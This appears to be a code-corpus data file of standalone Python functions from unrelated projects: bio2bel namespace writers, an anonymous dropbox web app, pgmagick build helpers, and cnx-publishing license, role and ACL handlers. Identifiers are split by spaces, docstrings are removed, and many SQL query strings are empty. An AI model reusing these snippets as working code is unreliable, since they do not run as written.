def add annotation to graph ( self , graph : BEL Graph ) -> None : if 'bio2bel' not in graph . annotation list : graph . annotation list [ 'bio2bel' ] = set ( ) graph . annotation list [ 'bio2bel' ] . add ( self . module name )
def drop bel namespace ( self ) -> Optional [ Namespace ] : namespace = self . get default namespace ( ) if namespace is not None : for entry in tqdm ( namespace . entries , desc = f'deleting entries in {self. get namespace name()}' ) : self . session . delete ( entry ) self . session . delete ( namespace ) log . info ( 'committing deletions' ) self . session . commit ( ) return namespace
def write bel namespace ( self , file : Text IO , use names : bool = False ) -> None : if not self . is populated ( ) : self . populate ( ) if use names and not self . has names : raise Value Error values = ( self . get namespace name to encoding ( desc = 'writing names' ) if use names else self . get namespace identifier to encoding ( desc = 'writing identifiers' ) ) write namespace ( namespace name = self . get namespace name ( ) , namespace keyword = self . get namespace keyword ( ) , namespace query url = self . identifiers url , values = values , file = file , )
def write bel annotation ( self , file : Text IO ) -> None : if not self . is populated ( ) : self . populate ( ) values = self . get namespace name to encoding ( desc = 'writing names' ) write annotation ( keyword = self . get namespace keyword ( ) , citation name = self . get namespace name ( ) , description = '' , values = values , file = file , )
def write bel namespace mappings ( self , file : Text IO , * * kwargs ) -> None : json . dump ( self . get namespace identifier to name ( * * kwargs ) , file , indent = 2 , sort keys = True )
def write directory ( self , directory : str ) -> bool : current md5 hash = self . get namespace hash ( ) md5 hash path = os . path . join ( directory , f'{self.module name}.belns.md5' ) if not os . path . exists ( md5 hash path ) : old md5 hash = None else : with open ( md5 hash path ) as file : old md5 hash = file . read ( ) . strip ( ) if old md5 hash == current md5 hash : return False with open ( os . path . join ( directory , f'{self.module name}.belns' ) , 'w' ) as file : self . write bel namespace ( file , use names = False ) with open ( md5 hash path , 'w' ) as file : print ( current md5 hash , file = file ) if self . has names : with open ( os . path . join ( directory , f'{self.module name}-names.belns' ) , 'w' ) as file : self . write bel namespace ( file , use names = True ) with open ( os . path . join ( directory , f'{self.module name}.belns.mapping' ) , 'w' ) as file : self . write bel namespace mappings ( file , desc = 'writing mapping' ) return True
def get long description ( ) : with codecs . open ( os . path . join ( HERE , 'README.rst' ) , encoding = 'utf-8' ) as f : long description = f . read ( ) return long description
def dropbox factory ( request ) : try : return request . registry . settings [ 'dropbox container' ] . get dropbox ( request . matchdict [ 'drop id' ] ) except Key Error : raise HTTP Not Found ( 'no such dropbox' )
def dropbox editor factory ( request ) : dropbox = dropbox factory ( request ) if is equal ( dropbox . editor token , request . matchdict [ 'editor token' ] . encode ( 'utf-8' ) ) : return dropbox else : raise HTTP Not Found ( 'invalid editor token' )
def sanitize filename ( filename ) : # TODO: fix broken splitext (it reveals everything of the filename after the first `.` - doh!) token = generate drop id ( ) name , extension = splitext ( filename ) if extension : return '%s%s' % ( token , extension ) else : return token
def create archive ( self ) : self . status = u'270 creating final encrypted backup of cleansed attachments' return self . create encrypted zip ( source = 'clean' , fs target dir = self . container . fs archive cleansed )
def size attachments ( self ) : total size = 0 for attachment in self . fs cleansed attachments : total size += stat ( attachment ) . st size return total size
def replies ( self ) : fs reply path = join ( self . fs replies path , 'message 001.txt' ) if exists ( fs reply path ) : return [ load ( open ( fs reply path , 'r' ) ) ] else : return [ ]
def message ( self ) : try : with open ( join ( self . fs path , u'message' ) ) as message file : return u'' . join ( [ line . decode ( 'utf-8' ) for line in message file . readlines ( ) ] ) except IO Error : return u''
def fs dirty attachments ( self ) : if exists ( self . fs attachment container ) : return [ join ( self . fs attachment container , attachment ) for attachment in listdir ( self . fs attachment container ) ] else : return [ ]
def fs cleansed attachments ( self ) : if exists ( self . fs cleansed attachment container ) : return [ join ( self . fs cleansed attachment container , attachment ) for attachment in listdir ( self . fs cleansed attachment container ) ] else : return [ ]
def dropbox form ( request ) : from briefkasten import generate post token token = generate post token ( secret = request . registry . settings [ 'post secret' ] ) return dict ( action = request . route url ( 'dropbox form submit' , token = token ) , fileupload url = request . route url ( 'dropbox fileupload' , token = token ) , * * defaults ( request ) )
def dropbox fileupload ( dropbox , request ) : attachment = request . POST [ 'attachment' ] attached = dropbox . add attachment ( attachment ) return dict ( files = [ dict ( name = attached , type = attachment . type , ) ] )
def dropbox submission ( dropbox , request ) : try : data = dropbox schema . deserialize ( request . POST ) except Exception : return HTTP Found ( location = request . route url ( 'dropbox form' ) ) # set the message dropbox . message = data . get ( 'message' ) # recognize submission from watchdog if 'testing secret' in dropbox . settings : dropbox . from watchdog = is equal ( unicode ( dropbox . settings [ 'test submission secret' ] ) , data . pop ( 'testing secret' , u'' ) ) # a non-js client might have uploaded an attachment via the form's fileupload field: if data . get ( 'upload' ) is not None : dropbox . add attachment ( data [ 'upload' ] ) # now we can call the process method dropbox . submit ( ) drop url = request . route url ( 'dropbox view' , drop id = dropbox . drop id ) print ( "Created dropbox %s" % drop url ) return HTTP Found ( location = drop url )
def belns ( keyword : str , file : Text IO , encoding : Optional [ str ] , use names : bool ) : directory = get data dir ( keyword ) obo url = f'http://purl.obolibrary.org/obo/{keyword}.obo' obo path = os . path . join ( directory , f'{keyword}.obo' ) obo cache path = os . path . join ( directory , f'{keyword}.obo.pickle' ) obo getter = make obo getter ( obo url , obo path , preparsed path = obo cache path ) graph = obo getter ( ) convert obo graph to belns ( graph , file = file , encoding = encoding , use names = use names , )
def belanno ( keyword : str , file : Text IO ) : directory = get data dir ( keyword ) obo url = f'http://purl.obolibrary.org/obo/{keyword}.obo' obo path = os . path . join ( directory , f'{keyword}.obo' ) obo cache path = os . path . join ( directory , f'{keyword}.obo.pickle' ) obo getter = make obo getter ( obo url , obo path , preparsed path = obo cache path ) graph = obo getter ( ) convert obo graph to belanno ( graph , file = file , )
def store helper ( model : Action , session : Optional [ Session ] = None ) -> None : if session is None : session = make session ( ) session . add ( model ) session . commit ( ) session . close ( )
def make session ( connection : Optional [ str ] = None ) -> Session : if connection is None : connection = get global connection ( ) engine = create engine ( connection ) create all ( engine ) session cls = sessionmaker ( bind = engine ) session = session cls ( ) return session
def create all ( engine , checkfirst = True ) : Base . metadata . create all ( bind = engine , checkfirst = checkfirst )
def ls ( cls , session : Optional [ Session ] = None ) -> List [ 'Action' ] : if session is None : session = make session ( ) actions = session . query ( cls ) . order by ( cls . created . desc ( ) ) . all ( ) session . close ( ) return actions
def count ( cls , session : Optional [ Session ] = None ) -> int : if session is None : session = make session ( ) count = session . query ( cls ) . count ( ) session . close ( ) return count
def get module config cls ( module name : str ) -> Type [ Abstract Module Config ] : # noqa: D202 class Module Config ( Abstract Module Config ) : NAME = f'bio2bel:{module name}' FILES = DEFAULT CONFIG PATHS + [ os . path . join ( DEFAULT CONFIG DIRECTORY , module name , 'config.ini' ) ] return Module Config
def get modules ( ) -> Mapping : modules = { } for entry point in iter entry points ( group = 'bio2bel' , name = None ) : entry = entry point . name try : modules [ entry ] = entry point . load ( ) except Version Conflict as exc : log . warning ( 'Version conflict in %s: %s' , entry , exc ) continue except Unknown Extra as exc : log . warning ( 'Unknown extra in %s: %s' , entry , exc ) continue except Import Error as exc : log . exception ( 'Issue with importing module %s: %s' , entry , exc ) continue return modules
def clear cache ( module name : str , keep database : bool = True ) -> None : data dir = get data dir ( module name ) if not os . path . exists ( data dir ) : return for name in os . listdir ( data dir ) : if name in { 'config.ini' , 'cfg.ini' } : continue if name == 'cache.db' and keep database : continue path = os . path . join ( data dir , name ) if os . path . isdir ( path ) : shutil . rmtree ( path ) else : os . remove ( path ) os . rmdir ( data dir )
def iterate managers ( connection , skip ) : for idx , name , manager cls in iterate manage classes ( skip ) : if name in skip : continue try : manager = manager cls ( connection = connection ) except Type Error as e : click . secho ( f'Could not instantiate {name}: {e}' , fg = 'red' ) else : yield idx , name , manager
def clear ( skip ) : for name in sorted ( MODULES ) : if name in skip : continue click . secho ( f'clearing cache for {name}' , fg = 'cyan' , bold = True ) clear cache ( name )
def sheet ( connection , skip , file : Text IO ) : from tabulate import tabulate header = [ '' , 'Name' , 'Description' , 'Terms' , 'Relations' ] rows = [ ] for i , ( idx , name , manager ) in enumerate ( iterate managers ( connection , skip ) , start = 1 ) : try : if not manager . is populated ( ) : continue except Attribute Error : click . secho ( f'{name} does not implement is populated' , fg = 'red' ) continue terms , relations = None , None if isinstance ( manager , BEL Namespace Manager Mixin ) : terms = manager . count model ( manager . namespace model ) if isinstance ( manager , BEL Manager Mixin ) : try : relations = manager . count relations ( ) except Type Error as e : relations = str ( e ) rows . append ( ( i , name , manager . doc . split ( '\n' ) [ 0 ] . strip ( ) . strip ( '.' ) , terms , relations ) ) print ( tabulate ( rows , headers = header , # tablefmt="fancy grid", ) )
def write ( connection , skip , directory , force ) : os . makedirs ( directory , exist ok = True ) from . manager . bel manager import BEL Manager Mixin import pybel for idx , name , manager in iterate managers ( connection , skip ) : if not isinstance ( manager , BEL Manager Mixin ) : continue click . secho ( name , fg = 'cyan' , bold = True ) path = os . path . join ( directory , f'{name}.bel.pickle' ) if os . path . exists ( path ) and not force : click . echo ( ' already exported') continue if not manager . is populated ( ) : click . echo ( ' unpopulated') else : graph = manager . to bel ( ) pybel . to pickle ( graph , path ) pybel . to json path ( graph , os . path . join ( directory , f'{name}.bel.json' ) )
def web ( connection , host , port ) : from bio2bel . web . application import create application app = create application ( connection = connection ) app . run ( host = host , port = port )
def actions ( connection ) : session = make session ( connection = connection ) for action in Action . ls ( session = session ) : click . echo ( f'{action.created} {action.action} {action.resource}' )
def count relations ( self ) -> int : if self . edge model is ... : raise Bio2BEL Missing Edge Model Error ( 'edge edge model is undefined/count bel relations is not overridden' ) elif isinstance ( self . edge model , list ) : return sum ( self . count model ( m ) for m in self . edge model ) else : return self . count model ( self . edge model )
def get exif info ( self ) : dict = { } for tag in EXIF TAGS : ret = self . img . attribute ( "EXIF:%s" % tag ) if ret and ret != 'unknown' : dict [ tag ] = ret return dict
def get version from pc ( search dirs , target ) : for dirname in search dirs : for root , dirs , files in os . walk ( dirname ) : for f in files : if f == target : file path = os . path . join ( root , target ) tmp = grep ( "Version: " , file path ) version = tmp . split ( ) [ 1 ] print ( "Found version %s in file %s" % ( version , file path ) ) return version
def version ( ) : with io . open ( 'pgmagick/ version.py' ) as input file : for line in input file : if line . startswith ( ' version ' ) : return ast . parse ( line ) . body [ 0 ] . value . s
def post license request ( request ) : uuid = request . matchdict [ 'uuid' ] posted data = request . json license url = posted data . get ( 'license url' ) licensors = posted data . get ( 'licensors' , [ ] ) with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( , ( uuid , ) ) try : # Check that the license exists existing license url = cursor . fetchone ( ) [ 0 ] except Type Error : # None Type if request . has permission ( 'publish.create-identifier' ) : cursor . execute ( , ( uuid , ) ) existing license url = None else : raise httpexceptions . HTTP Not Found ( ) if existing license url is None and license url is None : raise httpexceptions . HTTP Bad Request ( "license url is required" ) elif ( license url != existing license url or existing license url is None ) : cursor . execute ( , ( license url , ) ) try : # Check that it is a valid license id cursor . fetchone ( ) [ 0 ] except Type Error : # None returned raise httpexceptions . HTTP Bad Request ( "invalid license url" ) upsert license requests ( cursor , uuid , licensors ) resp = request . response resp . status int = 202 return resp
def delete license request ( request ) : uuid = request . matchdict [ 'uuid' ] posted uids = [ x [ 'uid' ] for x in request . json . get ( 'licensors' , [ ] ) ] with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : remove license requests ( cursor , uuid , posted uids ) resp = request . response resp . status int = 200 return resp
def get roles request ( request ) : uuid = request . matchdict [ 'uuid' ] user id = request . matchdict . get ( 'uid' ) args = [ uuid ] if user id is not None : fmt conditional = "AND user id = %s" args . append ( user id ) else : fmt conditional = "" with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( . format ( fmt conditional ) , args ) acceptances = [ r [ 0 ] for r in cursor . fetchall ( ) ] if not acceptances : if user id is not None : raise httpexceptions . HTTP Not Found ( ) else : cursor . execute ( , ( uuid , ) ) try : cursor . fetchone ( ) [ 0 ] except Type Error : # None Type raise httpexceptions . HTTP Not Found ( ) resp value = acceptances if user id is not None : resp value = acceptances [ 0 ] return resp value
def post roles request ( request ) : uuid = request . matchdict [ 'uuid' ] posted roles = request . json with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( , ( uuid , ) ) try : # Check that it exists cursor . fetchone ( ) [ 0 ] except Type Error : if request . has permission ( 'publish.create-identifier' ) : cursor . execute ( , ( uuid , ) ) else : raise httpexceptions . HTTP Not Found ( ) try : upsert users ( cursor , [ r [ 'uid' ] for r in posted roles ] ) except User Fetch Error as exc : raise httpexceptions . HTTP Bad Request ( exc . message ) upsert role requests ( cursor , uuid , posted roles ) resp = request . response resp . status int = 202 return resp
def delete roles request ( request ) : uuid = request . matchdict [ 'uuid' ] posted roles = request . json with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : remove role requests ( cursor , uuid , posted roles ) resp = request . response resp . status int = 200 return resp
def get acl ( request ) : uuid = request . matchdict [ 'uuid' ] with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( , ( uuid , ) ) try : # Check that it exists cursor . fetchone ( ) [ 0 ] except Type Error : raise httpexceptions . HTTP Not Found ( ) cursor . execute ( , ( uuid , ) ) acl = [ r [ 0 ] for r in cursor . fetchall ( ) ] return acl
def post acl request ( request ) : uuid = request . matchdict [ 'uuid' ] posted = request . json permissions = [ ( x [ 'uid' ] , x [ 'permission' ] , ) for x in posted ] with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( , ( uuid , ) ) try : # Check that it exists cursor . fetchone ( ) [ 0 ] except Type Error : if request . has permission ( 'publish.create-identifier' ) : cursor . execute ( , ( uuid , ) ) else : raise httpexceptions . HTTP Not Found ( ) upsert acl ( cursor , uuid , permissions ) resp = request . response resp . status int = 202 return resp
def delete acl request ( request ) : uuid = request . matchdict [ 'uuid' ] posted = request . json permissions = [ ( x [ 'uid' ] , x [ 'permission' ] , ) for x in posted ] with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : remove acl ( cursor , uuid , permissions ) resp = request . response resp . status int = 200 return resp
def lookup api key info ( ) : info = { } with db connect ( ) as conn : with conn . cursor ( ) as cursor : cursor . execute ( ALL KEY INFO SQL STMT ) for row in cursor . fetchall ( ) : id , key , name , groups = row user id = "api key:{}" . format ( id ) info [ key ] = dict ( id = id , user id = user id , name = name , groups = groups ) return info
def includeme ( config ) : api key authn policy = API Key Authentication Policy ( ) config . include ( 'openstax accounts' ) openstax authn policy = config . registry . get Utility ( I Openstax Accounts Authentication Policy ) # Set up api & user authentication policies. policies = [ api key authn policy , openstax authn policy ] authn policy = Multi Authentication Policy ( policies ) config . set authentication policy ( authn policy ) # Set up the authorization policy. authz policy = ACL Authorization Policy ( ) config . set authorization policy ( authz policy )
def expandvars dict ( settings ) : return dict ( ( key , os . path . expandvars ( value ) ) for key , value in settings . iteritems ( ) )
def task ( * * kwargs ) : def wrapper ( wrapped ) : def callback ( scanner , name , obj ) : celery app = scanner . config . registry . celery app celery app . task ( * * kwargs ) ( obj ) venusian . attach ( wrapped , callback ) return wrapped return wrapper
def post publication processing ( event , cursor ) : module ident , ident hash = event . module ident , event . ident hash celery app = get current registry ( ) . celery app # Check baking is not already queued. cursor . execute ( 'SELECT result id::text ' 'FROM document baking result associations ' 'WHERE module ident = %s' , ( module ident , ) ) for result in cursor . fetchall ( ) : state = celery app . Async Result ( result [ 0 ] ) . state if state in ( 'QUEUED' , 'STARTED' , 'RETRY' ) : logger . debug ( 'Already queued module ident={} ident hash={}' . format ( module ident , ident hash ) ) return logger . debug ( 'Queued for processing module ident={} ident hash={}' . format ( module ident , ident hash ) ) recipe ids = get recipe ids ( module ident , cursor ) update module state ( cursor , module ident , 'processing' , recipe ids [ 0 ] ) # Commit the state change before preceding. cursor . connection . commit ( ) # Start of task # FIXME Looking up the task isn't the most clear usage here. task name = 'cnxpublishing.subscribers.baking processor' baking processor = celery app . tasks [ task name ] result = baking processor . delay ( module ident , ident hash ) baking processor . backend . store result ( result . id , None , 'QUEUED' ) # Save the mapping between a celery task and this event. track baking proc state ( result , module ident , cursor )
def parse archive uri ( uri ) : parsed = urlparse ( uri ) path = parsed . path . rstrip ( '/' ) . split ( '/' ) ident hash = path [ - 1 ] ident hash = unquote ( ident hash ) return ident hash
def declare browsable routes ( config ) : # This makes our routes slashed, which is good browser behavior. config . add notfound view ( default exceptionresponse view , append slash = True ) add route = config . add route add route ( 'admin-index' , '/a/' ) add route ( 'admin-moderation' , '/a/moderation/' ) add route ( 'admin-api-keys' , '/a/api-keys/' ) add route ( 'admin-add-site-messages' , '/a/site-messages/' , request method = 'GET' ) add route ( 'admin-add-site-messages-POST' , '/a/site-messages/' , request method = 'POST' ) add route ( 'admin-delete-site-messages' , '/a/site-messages/' , request method = 'DELETE' ) add route ( 'admin-edit-site-message' , '/a/site-messages/{id}/' , request method = 'GET' ) add route ( 'admin-edit-site-message-POST' , '/a/site-messages/{id}/' , request method = 'POST' ) add route ( 'admin-content-status' , '/a/content-status/' ) add route ( 'admin-content-status-single' , '/a/content-status/{uuid}' ) add route ( 'admin-print-style' , '/a/print-style/' ) add route ( 'admin-print-style-single' , '/a/print-style/{style}' )
def includeme ( config ) : config . include ( 'pyramid jinja2' ) config . add jinja2 renderer ( '.html' ) config . add jinja2 renderer ( '.rss' ) config . add static view ( name = '/a/static' , path = "cnxpublishing:static/" ) # Commit the configuration otherwise the jija2 env won't have # a `globals` assignment. config . commit ( ) # Place a few globals in the template environment. from cnxdb . ident hash import join ident hash for ext in ( '.html' , '.rss' , ) : jinja2 env = config . get jinja2 environment ( ext ) jinja2 env . globals . update ( join ident hash = join ident hash , ) declare api routes ( config ) declare browsable routes ( config )
def formatter callback factory ( ) : # pragma: no cover includes = [ ] exercise url template = '{base Url}/api/exercises?q={field}:"{{item Code}}"' settings = get current registry ( ) . settings exercise base url = settings . get ( 'embeddables.exercise.base url' , None ) exercise matches = [ match . split ( ',' , 1 ) for match in aslist ( settings . get ( 'embeddables.exercise.match' , '' ) , flatten = False ) ] exercise token = settings . get ( 'embeddables.exercise.token' , None ) mathml url = settings . get ( 'mathmlcloud.url' , None ) memcache servers = settings . get ( 'memcache servers' ) if memcache servers : memcache servers = memcache servers . split ( ) else : memcache servers = None if exercise base url and exercise matches : mc client = None if memcache servers : mc client = memcache . Client ( memcache servers , debug = 0 ) for ( exercise match , exercise field ) in exercise matches : template = exercise url template . format ( base Url = exercise base url , field = exercise field ) includes . append ( exercise callback factory ( exercise match , template , mc client , exercise token , mathml url ) ) return includes
def db connect ( connection string = None , * * kwargs ) : if connection string is None : connection string = get current registry ( ) . settings [ CONNECTION STRING ] db conn = psycopg2 . connect ( connection string , * * kwargs ) try : with db conn : yield db conn finally : db conn . close ( )
def upsert pending licensors ( cursor , document id ) : cursor . execute ( , ( document id , ) ) uuid , metadata = cursor . fetchone ( ) acceptors = set ( [ uid for uid , type in dissect roles ( metadata ) ] ) # Acquire a list of existing acceptors. cursor . execute ( , ( uuid , ) ) existing acceptors mapping = dict ( cursor . fetchall ( ) ) # Who's not in the existing list? existing acceptors = set ( existing acceptors mapping . keys ( ) ) new acceptors = acceptors . difference ( existing acceptors ) # Insert the new licensor acceptors. for acceptor in new acceptors : cursor . execute ( , ( uuid , acceptor , ) ) # Has everyone already accepted? cursor . execute ( , ( uuid , ) ) defectors = set ( cursor . fetchall ( ) ) if not defectors : # Update the pending document license acceptance state. cursor . execute ( , ( document id , ) )
def upsert pending roles ( cursor , document id ) : cursor . execute ( , ( document id , ) ) uuid , metadata = cursor . fetchone ( ) acceptors = set ( [ ( uid , role type to db type ( type ) , ) for uid , type in dissect roles ( metadata ) ] ) # Upsert the user info. upsert users ( cursor , [ x [ 0 ] for x in acceptors ] ) # Acquire a list of existing acceptors. cursor . execute ( , ( uuid , ) ) existing roles = set ( [ ( r , t , ) for r , t in cursor . fetchall ( ) ] ) # Who's not in the existing list? existing acceptors = existing roles new acceptors = acceptors . difference ( existing acceptors ) # Insert the new role acceptors. for acceptor , type in new acceptors : cursor . execute ( , ( uuid , acceptor , type ) ) # Has everyone already accepted? cursor . execute ( , ( uuid , ) ) defectors = set ( cursor . fetchall ( ) ) if not defectors : # Update the pending document license acceptance state. cursor . execute ( , ( document id , ) )
def obtain licenses ( ) : with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( ) licenses = { r [ 0 ] : r [ 1 ] for r in cursor . fetchall ( ) } return licenses
def validate license ( model ) : license mapping = obtain licenses ( ) try : license url = model . metadata [ 'license url' ] except Key Error : raise exceptions . Missing Required Metadata ( 'license url' ) try : license = license mapping [ license url ] except Key Error : raise exceptions . Invalid License ( license url ) if not license [ 'is valid for publication' ] : raise exceptions . Invalid License ( license url )
def validate model ( cursor , model ) : # Check the license is one valid for publication. validate license ( model ) validate roles ( model ) # Other required metadata includes: title, summary required metadata = ( 'title' , 'summary' , ) for metadata key in required metadata : if model . metadata . get ( metadata key ) in [ None , '' , [ ] ] : raise exceptions . Missing Required Metadata ( metadata key ) # Ensure that derived-from values are either None # or point at a live record in the archive. validate derived from ( cursor , model ) # FIXME Valid language code? # Are the given 'subjects' validate subjects ( cursor , model )
def lookup document pointer ( ident hash , cursor ) : id , version = split ident hash ( ident hash , split version = True ) stmt = "SELECT name FROM modules WHERE uuid = %s" args = [ id ] if version and version [ 0 ] is not None : operator = version [ 1 ] is None and 'is' or '=' stmt += " AND (major version = %s AND minor version {} %s)" . format ( operator ) args . extend ( version ) cursor . execute ( stmt , args ) try : title = cursor . fetchone ( ) [ 0 ] except Type Error : raise Document Lookup Error ( ) else : metadata = { 'title' : title } return cnxepub . Document Pointer ( ident hash , metadata )
def check pending document license state ( cursor , document id ) : cursor . execute ( , ( document id , ) ) try : is accepted = cursor . fetchone ( ) [ 0 ] except Type Error : # There are no licenses associated with this document. is accepted = True return is accepted
def check pending document role state ( cursor , document id ) : cursor . execute ( , ( document id , ) ) try : is accepted = cursor . fetchone ( ) [ 0 ] except Type Error : # There are no roles to accept is accepted = True return is accepted
def update pending document state ( cursor , document id , is license accepted , are roles accepted ) : args = ( bool ( is license accepted ) , bool ( are roles accepted ) , document id , ) cursor . execute ( , args )
def check publication state ( publication id ) : with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( , ( publication id , ) ) publication state , publication messages = cursor . fetchone ( ) return publication state , publication messages
def node to model ( tree or item , metadata = None , parent = None , lucent id = cnxepub . TRANSLUCENT BINDER ID ) : if 'contents' in tree or item : # It is a binder. tree = tree or item binder = cnxepub . Translucent Binder ( metadata = tree ) for item in tree [ 'contents' ] : node = node to model ( item , parent = binder , lucent id = lucent id ) if node . metadata [ 'title' ] != item [ 'title' ] : binder . set title for node ( node , item [ 'title' ] ) result = binder else : # It is an item pointing at a document. item = tree or item result = cnxepub . Document Pointer ( item [ 'id' ] , metadata = item ) if parent is not None : parent . append ( result ) return result
def reassemble binder ( id , tree , metadata ) : binder = cnxepub . Binder ( id , metadata = metadata ) for item in tree [ 'contents' ] : node = node to model ( item , parent = binder ) if node . metadata [ 'title' ] != item [ 'title' ] : binder . set title for node ( node , item [ 'title' ] ) return binder
def set post publications state ( cursor , module ident , state name , state message = '' ) : # pragma: no cover cursor . execute ( , ( module ident , state name , state message ) )
def update module state ( cursor , module ident , state name , recipe ) : # pragma: no cover cursor . execute ( , ( state name , recipe , module ident ) )
def get moderation ( request ) : with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( ) moderations = [ x [ 0 ] for x in cursor . fetchall ( ) ] return moderations
def includeme ( config ) : settings = config . registry . settings session factory = Signed Cookie Session Factory ( settings [ 'session key' ] ) config . set session factory ( session factory )
def get api keys ( request ) : with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( ) api keys = [ x [ 0 ] for x in cursor . fetchall ( ) ] return api keys
def admin content status single ( request ) : uuid = request . matchdict [ 'uuid' ] try : UUID ( uuid ) except Value Error : raise httpexceptions . HTTP Bad Request ( '{} is not a valid uuid' . format ( uuid ) ) statement , sql args = get baking statuses sql ( { 'uuid' : uuid } ) with db connect ( cursor factory = Dict Cursor ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( statement , sql args ) modules = cursor . fetchall ( ) if len ( modules ) == 0 : raise httpexceptions . HTTP Bad Request ( '{} is not a book' . format ( uuid ) ) states = [ ] collection info = modules [ 0 ] for row in modules : message = '' state = row [ 'state' ] or 'PENDING' if state == 'FAILURE' : # pragma: no cover if row [ 'traceback' ] is not None : message = row [ 'traceback' ] latest recipe = row [ 'latest recipe id' ] current recipe = row [ 'recipe id' ] if ( latest recipe is not None and current recipe != latest recipe ) : state += ' stale recipe' states . append ( { 'version' : row [ 'current version' ] , 'recipe' : row [ 'recipe' ] , 'created' : str ( row [ 'created' ] ) , 'state' : state , 'state message' : message , } ) return { 'uuid' : str ( collection info [ 'uuid' ] ) , 'title' : collection info [ 'name' ] . decode ( 'utf-8' ) , 'authors' : format authors ( collection info [ 'authors' ] ) , 'print style' : collection info [ 'print style' ] , 'current recipe' : collection info [ 'recipe id' ] , 'current ident' : collection info [ 'module ident' ] , 'current state' : states [ 0 ] [ 'state' ] , 'states' : states }
def admin content status single POST ( request ) : args = admin content status single ( request ) title = args [ 'title' ] if args [ 'current state' ] == 'SUCCESS' : args [ 'response' ] = title + ' is not stale, no need to bake' return args with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( "SELECT stateid FROM modules WHERE module ident=%s" , vars = ( args [ 'current ident' ] , ) ) data = cursor . fetchall ( ) if len ( data ) == 0 : raise httpexceptions . HTTP Bad Request ( 'invalid module ident: {}' . format ( args [ 'current ident' ] ) ) if data [ 0 ] [ 0 ] == 5 or data [ 0 ] [ 0 ] == 6 : args [ 'response' ] = title + ' is already baking/set to bake' return args cursor . execute ( , vars = ( args [ 'current ident' ] , ) ) args [ 'response' ] = title + " set to bake!" return args
def insert metadata ( cursor , model , publisher , message ) : params = model . metadata . copy ( ) params [ 'publisher' ] = publisher params [ 'publication message' ] = message params [ ' portal type' ] = model to portaltype ( model ) params [ 'summary' ] = str ( cnxepub . Document Summary Formatter ( model ) ) # Transform person structs to id lists for database array entry. for person field in ATTRIBUTED ROLE KEYS : params [ person field ] = [ parse user uri ( x [ 'id' ] ) for x in params . get ( person field , [ ] ) ] params [ 'parent ident hash' ] = parse parent ident hash ( model ) # Assign the id and version if one is known. if model . ident hash is not None : uuid , version = split ident hash ( model . ident hash , split version = True ) params [ ' uuid' ] = uuid params [ ' major version' ] , params [ ' minor version' ] = version # Lookup legacy ``moduleid``. cursor . execute ( "SELECT moduleid FROM latest modules WHERE uuid = %s" , ( uuid , ) ) # There is the chance that a uuid and version have been set, #   but a previous publication does not exist. Therefore the #   moduleid will not be found. This happens on a pre-publication. try : moduleid = cursor . fetchone ( ) [ 0 ] except Type Error : # None Type moduleid = None params [ ' moduleid' ] = moduleid # Verify that uuid is reserved in document contols. If not, add it. cursor . execute ( "SELECT * from document controls where uuid = %s" , ( uuid , ) ) try : cursor . fetchone ( ) [ 0 ] except Type Error : # None Type cursor . execute ( "INSERT INTO document controls (uuid) VALUES (%s)" , ( uuid , ) ) created = model . metadata . get ( 'created' , None ) # Format the statement to accept the identifiers. stmt = MODULE INSERTION TEMPLATE . format ( * * { ' uuid ' : "%( uuid)s::uuid" , ' major version ' : "%( major version)s" , ' minor version ' : "%( minor version)s" , ' moduleid ' : moduleid is None and "DEFAULT" or "%( moduleid)s" , ' created ' : created is None and "DEFAULT" or "%(created)s" , } ) else : created = model . metadata . get ( 'created' , None ) # Format the statement for defaults. stmt = MODULE INSERTION TEMPLATE . format ( * * { ' uuid ' : "DEFAULT" , ' major version ' : "DEFAULT" , ' minor version ' : "DEFAULT" , ' moduleid ' : "DEFAULT" , ' created ' : created is None and "DEFAULT" or "%(created)s" , } ) # Insert the metadata cursor . execute ( stmt , params ) module ident , ident hash = cursor . fetchone ( ) # Insert optional roles insert optional roles ( cursor , model , module ident ) return module ident , ident hash
def insert tree ( cursor , tree , parent id = None , index = 0 , is collated = False ) : if isinstance ( tree , dict ) : if tree [ 'id' ] == 'subcol' : document id = None title = tree [ 'title' ] else : cursor . execute ( , ( tree [ 'id' ] , ) ) try : document id , document title = cursor . fetchone ( ) except Type Error : # None Type raise Value Error ( "Missing published document for '{}'." . format ( tree [ 'id' ] ) ) if tree . get ( 'title' , None ) : title = tree [ 'title' ] else : title = document title # TODO We haven't settled on a flag (name or value) #      to pin the node to a specific version. is latest = True cursor . execute ( TREE NODE INSERT , dict ( document id = document id , parent id = parent id , title = title , child order = index , is latest = is latest , is collated = is collated ) ) node id = cursor . fetchone ( ) [ 0 ] if 'contents' in tree : insert tree ( cursor , tree [ 'contents' ] , parent id = node id , is collated = is collated ) elif isinstance ( tree , list ) : for tree node in tree : insert tree ( cursor , tree node , parent id = parent id , index = tree . index ( tree node ) , is collated = is collated )
